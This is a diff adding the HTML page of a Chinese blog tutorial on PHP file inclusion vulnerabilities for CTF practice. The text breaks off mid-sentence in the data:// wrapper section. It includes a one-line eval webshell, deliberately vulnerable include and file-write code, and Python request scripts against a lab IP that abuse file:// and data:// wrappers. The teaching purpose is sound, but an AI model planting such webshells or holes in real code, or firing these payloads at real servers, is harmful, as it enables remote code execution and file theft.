@@ -1,0 +1,1159 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jpg">
+  <link rel="icon" href="/img/logo.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="ExploreIO">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="这是一片有关文件包含漏洞手法总结的文章，里面讲了php里面与文件相关的函数以及伪协议，还有各种漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞手法总结">
+<meta property="og:url" content="https://exploreio.github.io/2026/04/10/file_include/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="这是一片有关文件包含漏洞手法总结的文章，里面讲了php里面与文件相关的函数以及伪协议，还有各种漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://exploreio.github.io/img/eee.png">
+<meta property="article:published_time" content="2026-04-10T12:30:00.000Z">
+<meta property="article:modified_time" content="2026-04-10T12:24:55.483Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="手法">
+<meta property="article:tag" content="文件包含漏洞">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://exploreio.github.io/img/eee.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>文件包含漏洞手法总结 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"exploreio.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"▌","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":5,"color":"#36D399","options":{"showSpinner":false,"trickleSpeed":100,"easing":"ease-in-out"}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>ExploreIO&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/eee.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="文件包含漏洞手法总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-10 20:30" pubdate>
+          2026年4月10日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="CTF"
+        id="heading-59db9139e685f7d6a4a8784f9221066f" role="tab" data-toggle="collapse" href="#collapse-59db9139e685f7d6a4a8784f9221066f"
+        aria-expanded="true"
+      >
+        CTF
+        <span class="list-group-count">(3)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-59db9139e685f7d6a4a8784f9221066f"
+           role="tabpanel" aria-labelledby="heading-59db9139e685f7d6a4a8784f9221066f">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="web安全"
+        id="heading-3462cf7781bac1cfac12668cdfaa788c" role="tab" data-toggle="collapse" href="#collapse-3462cf7781bac1cfac12668cdfaa788c"
+        aria-expanded="true"
+      >
+        web安全
+        <span class="list-group-count">(3)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-3462cf7781bac1cfac12668cdfaa788c"
+           role="tabpanel" aria-labelledby="heading-3462cf7781bac1cfac12668cdfaa788c">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2026/04/04/ssti-sec1/" title="ssti模板注入手法总结python篇（一）"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">ssti模板注入手法总结python篇（一）</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2026/04/05/ssti-sec2/" title="ssti模板注入手法总结python篇（二）"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">ssti模板注入手法总结python篇（二）</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2026/04/10/file_include/" title="文件包含漏洞手法总结"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">文件包含漏洞手法总结</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">文件包含漏洞手法总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="文件包含漏洞手法总结"><a href="#文件包含漏洞手法总结" class="headerlink" title="文件包含漏洞手法总结"></a>文件包含漏洞手法总结</h2><p>废话不多说直接开始讲</p>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>这个是文件包含基础，在函数这个板块我们了解的主要是文件包含相关的函数</p>
+<p>主要有两大类：文件包含函数（四小只），文件系统函数</p>
+<p>在这里先了解一下四小只文件包含函数</p>
+<p>文件包含函数有四小只是哪四小只呢？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>、<span class="hljs-keyword">require</span>、<span class="hljs-keyword">include_once</span>、<span class="hljs-keyword">require_once</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP文件包含函数有以下四种：<br><br>include<br>inclued_once<br>require<br>require_once<br><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">()</span></span>/<span class="hljs-built_in">require_once</span>()：如果在包含过程中有错，那么直接退出，不执行进一步操作。<br><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">()</span></span>/<span class="hljs-built_in">include_once</span>(): 如果在包含过程中出错，只会发出警告<br><br>加上后缀_once的作用：如果文件已经包含过了，那么不会再次包含<br><br>当利用这四大漏洞函数包含文件的时候，不论什么类型的文件，都会作为PHP脚本解析（注意这句话的意思，这个的意思是文件里面的内容需要使用php的标签包裹住）<br></code></pre></td></tr></table></figure>
+
+<h4 id="include"><a href="#include" class="headerlink" title="include"></a>include</h4><p>在这里我们介绍其中的第一个include函数</p>
+<p>这里我们可以做一个实验</p>
+<p>1.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;1.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;成功包含&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/file_include/image-20260408183942176.png" srcset="/img/loading.gif" lazyload alt="执行结果"></p>
+<p>可以发现是可以执行webshell的</p>
+<p>可以试一试这个函数的一个特性，包含不存在的文件的时候报错，不影响下一步</p>
+<p><img src="/../img/file_include/image-20260408184610315.png" srcset="/img/loading.gif" lazyload alt="image-20260408184610315"></p>
+<p>可以发现可以执行echo</p>
+<p>还有一个特性(只要文件的内容是php代码，就可以执行)可以试一试，在同一个目录下面写入文件</p>
+<p>phpinfo.txt</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;phpinfo.txt&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/file_include/image-20260408185222367.png" srcset="/img/loading.gif" lazyload alt="image-20260408185222367"></p>
+<h4 id="require"><a href="#require" class="headerlink" title="require"></a>require</h4><p>1.php</p>
+<p>还是使用上面那个文件</p>
+<p>index.php</p>
+<p>文件修改为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;1.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;成功包含&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/file_include/image-20260408184235176.png" srcset="/img/loading.gif" lazyload alt="image-20260408184235176"></p>
+<p>发现还是可以执行</p>
+<p>还可以试一试这个函数遇到没有的文件包含会直接报错不会，执行下一步</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;2.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/file_include/image-20260408185529953.png" srcset="/img/loading.gif" lazyload alt="image-20260408185529953"></p>
+<p>执行不了</p>
+<h4 id="include-once"><a href="#include-once" class="headerlink" title="include_once"></a>include_once</h4><p>用法还是那个用法</p>
+<p>这里试一试他的特性，遇到包含过的函数是不会再一次包含的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;1.php&quot;</span>;<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;1.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/file_include/image-20260408185843708.png" srcset="/img/loading.gif" lazyload alt="image-20260408185843708"></p>
+<p>可以注意到这个还是可以使用的，这个时候我们可以知道，这个只是不会使用两个1.php</p>
+<p>但是遇到包含两次是不会报错的</p>
+<h4 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h4><p>使用方法都是一样的</p>
+<p>在这里就跳过了</p>
+<h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h4><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;1.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span> ;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个函数是可以将文件内容赋值给变量</p>
+<p>这样就可以输出文件内容了</p>
+<p><img src="/../img/file_include/image-20260408190657728.png" srcset="/img/loading.gif" lazyload alt="image-20260408190657728"></p>
+<p>注意，当我们包含的文件是php代码的时候，需要查看文件源代码才能看到</p>
+<h4 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h4><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$data</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>传入参数</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">?<span class="hljs-keyword">file</span>=<span class="hljs-number">3.</span>php&amp;<span class="hljs-keyword">data</span>=woshishui<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/file_include/image-20260408191832548.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以发现输出的是写入内容的数字</p>
+<h4 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h4><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个函数是可以读取文件内容的函数，返回的内容是文件的字符数量</p>
+<p><img src="/../img/file_include/image-20260408192412157.png" srcset="/img/loading.gif" lazyload alt="image-20260408192412157"></p>
+<p>注意当文件内容是php代码的时候，我们得使用查看源代码才能看到</p>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>在细致的讲php伪协议之前我们先大致的了解一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">// — 访问本地文件系统</span><br>http:<span class="hljs-comment">// — 访问 HTTP(s) 网址</span><br>ftp:<span class="hljs-comment">// — 访问 FTP(s) URLs</span><br>php:<span class="hljs-comment">// — 访问各个输入/输出流（I/O streams）</span><br>zlib:<span class="hljs-comment">// — 压缩流</span><br>data:<span class="hljs-comment">// — 数据（RFC 2397）</span><br>glob:<span class="hljs-comment">// — 查找匹配的文件路径模式</span><br>phar:<span class="hljs-comment">// — PHP 归档</span><br>ssh2:<span class="hljs-comment">// — Secure Shell 2</span><br>rar:<span class="hljs-comment">// — RAR</span><br>ogg:<span class="hljs-comment">// — 音频流</span><br>expect:<span class="hljs-comment">// — 处理交互式的流</span><br></code></pre></td></tr></table></figure>
+
+<p>上面这些是php所支持的伪协议</p>
+<p>下面有一个图片可以形象的说明了伪协议的利用以及利用条件</p>
+<p><img src="/../img/file_include/123sdfj.png" srcset="/img/loading.gif" lazyload alt="123sdfj"></p>
+<p>接下来就开始讲各个伪协议的使用方法</p>
+<h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>基本的使用方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意使用这个一定要绝对路径</p>
+<p>可以这样发包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url  = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php/&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;file://C:/phpstudy_pro/WWW/include/include/1.txt&#x27;</span>&#125;<br>r = requests.get(url, params=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<p>但是如果我们使用相对路径是使用不了的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url  = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php/&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;file://./1.txt&#x27;</span>&#125;<br>r = requests.get(url, params=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><p>data伪协议是将我所执行的内容当做文件内容传给include等包含函数</p>
+<p>这个伪协议是可以直接执行php代码的</p>
+<p>在实验之前我们需要配置一下php.ini文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_fopen = On<br>allow_url_include = On<br></code></pre></td></tr></table></figure>
+
+<p>我们可以自己实验一下,主要是感受data伪协议是怎么将我们输入的内容当做文件内容的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file1&#x27;</span>];<br><span class="hljs-variable">$file2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file2&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file1</span>) == <span class="hljs-string">&#x27;nihao&#x27;</span>)<br>&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$file2</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以知道这个的条件是如果$file1的内容是nihao则包含$file2</p>
+<p>于是可以这样构造python代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url  = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php/&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;file1&#x27;</span>:<span class="hljs-string">&#x27;data://text/plain,nihao&#x27;</span>,<span class="hljs-string">&#x27;file2&#x27;</span>:<span class="hljs-string">&#x27;1.txt&#x27;</span>&#125;<br>r = requests.get(url, params=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<p>这个例子就很好的知道了我们是可以控制文件内容了</p>
+<p>data:&#x2F;&#x2F;伪协议有两种格式，一种是明文一种是base64</p>
+<h5 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain,"></a>data:&#x2F;&#x2F;text&#x2F;plain,</h5><p>基本结构</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain,PHP代码</span><br></code></pre></td></tr></table></figure>
+
+<p>关键注意：<br>text&#x2F;plain：表示传递的是 “纯文本数据”；<br>PHP 代码中的特殊字符（如空格、&amp;、&#x3D;）必须 URL 编码（比如空格编码成%20）；</p>
+<p>于是开始测试一下</p>
+<p>在服务端的代码是</p>
